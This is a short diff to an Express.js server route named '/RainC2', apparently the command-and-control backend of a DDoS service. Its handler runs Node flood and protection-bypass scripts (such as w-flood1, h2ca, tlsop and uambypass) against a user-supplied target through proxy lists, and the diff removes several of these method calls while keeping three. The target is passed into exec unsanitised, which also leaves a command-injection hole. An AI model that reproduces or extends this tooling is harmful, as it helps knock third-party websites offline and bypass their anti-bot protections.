@@ -60,13 +60,6 @@ app.get('/RainC2', (req, res) => {
             exec(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
     exec(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
     exec(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
-                exec(`node methods/rawcaptcha.js ${target} 60 5 4 6`);
-            exec(`node methods/browsersun.js ${target} proxy.txt 10 120 100 30`);
-            exec(`node methods/kbrowser.js ${target} proxy.txt 10 120 100 30`);
-                        exec(`node methods/tlsop.js ${target} ${time} 100 10 proxy.txt`);
-                                    exec(`node methods/h2ca.js ${target} ${time} 100 10 proxy.txt`);
-                                                exec(`node methods/R-GOST.js ${target} ${time} 30 10 proxy.txt`);
-                                               exec(`node methods/uambypass.js ${target} ${time} 100 proxy.txt`);
   }
 });
 
